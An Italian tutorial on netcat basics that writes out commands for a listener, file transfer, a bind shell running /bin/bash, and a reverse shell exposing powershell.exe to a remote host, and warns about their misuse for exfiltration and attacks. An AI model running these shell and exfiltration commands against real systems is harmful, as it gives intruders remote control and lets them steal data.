# Basi sull'utilizzo di netcat

## Introduzione

Netcat è un'utility che nasce in ambito Linux / Unix, ma disponibile anche per Windows, ed è considerata il coltellino svizzero usato sia in ambito networking che in ambito cybersecurity.

Il suo utilizzo basilare è molto semplice: viene avviato su un host in modalità server, e su un altro host in modalità client, e collegando il client al server è possibile instaurare una comunicazione tra due host; la cosa è utile per verificare se è possibile la connessione tra due host, ma non solo, le possibilità sono numerose, come illustrato nei prossimi paragrafi.

## Instaurare una connessione tra due host

Come scritto sopra, l'utilizzo tipico di netcat avviene tra due host, dove uno funge da server (e quindi rimane in attesa di connessioni) e l'altro da client; per lanciare il server dovrò eseguire un comando come questo:

~~~shell
nc -nlvp 22222
~~~

dove 22222 è la porta TCP usata per rimanere in ascolto, mentre per instaurare la connessione dal client dovrò usare il comando

~~~shell
nc -nv 172.16.1.1 22222
~~~

dove 172.16.1.1 è l'indirizzo IP del server netcat e 22222 è la porta TCP sul server che rimane in attesa di connessioni.

Una volta stabilita la connessione, è possibile scambiarsi messaggi di testo come in una sorta di chat, ma netcat può fare molto di più.

## Trasferire file tra due host

Netcat può servire per trasferire file tra due host, ma per fare questo, dovrò lanciare il server e il client in modo opportuno; per la parte server, eseguirò questo comando:

~~~shell
nc -nlvp 22222 > test/cattura.pcap
~~~

dove viene fatta una redirezione in output sul file test/cattura.pcap, mentre sul client il comando da lanciare è il seguente:

~~~shell
nc -nv 172.16.1.1 22222 < cattura.pcap
~~~

in cui viene preso in input il file cattura.pcap da trasferire sul server.

Questo uso di netcat può avere implicazioni importanti dal punto di vista della cybersecurity, poiché l'utility potrebbe essere usata per esfiltrare file da un host compromesso.

## Eseguire una shell sul server

Netcat può essere anche usato per eseguire una shell, come ad esempio aprire una shell sul server e connettersi dal client per poter eseguire quella shell; sul server dovremo usare il comando:

~~~shell
nc -nlvp 22222 -e /bin/bash
~~~

dove l'opzione -e serve per indicare il percorso di una shell utilizzabile (attenzione che su alcune distro Linux l'opzione -e non è disponibile), mentre sul client va eseguito il comando

~~~shell
nc -nv 172.16.1.1 22222
~~~

e magicamente avremo a disposizione una shell sul server con i privilegi dell'utente con il quale abbiamo lanciato netcat; anche in questo caso, le implicazioni sulla cybersecurity possono essere facilmente immaginate.

## Eseguire una reverse shell

A differenza dell'esempio precedente, una reverse shell (cioè il server che ha a propria disposizione una shell su un client) è ancora più impattante in termini di cybersecurity, poiché significa che il client potrebbe mettere a disposizione di un server esterno una propria shell, eseguita con i privilegi dell'utente con cui viene lanciato netcat.

Per eseguire una reverse shell, si mette normalmente in ascolto netcat sul server:

~~~shell
nc -nlvp 22222
~~~

mentre sul client (si prenda ad esempio un client Windows) viene eseguita la connessione al server

~~~shell
nc -nv 172.16.1.1 22222 -e powershell.exe
~~~

In questo modo il server 172.16.1.1 ha a disposizione una shell Powershell sul PC Windows che nel nostro esempio funge da client, e nel malaugurato caso che l'utente sia un amministratore, i danni che può fare un attaccante sono infiniti.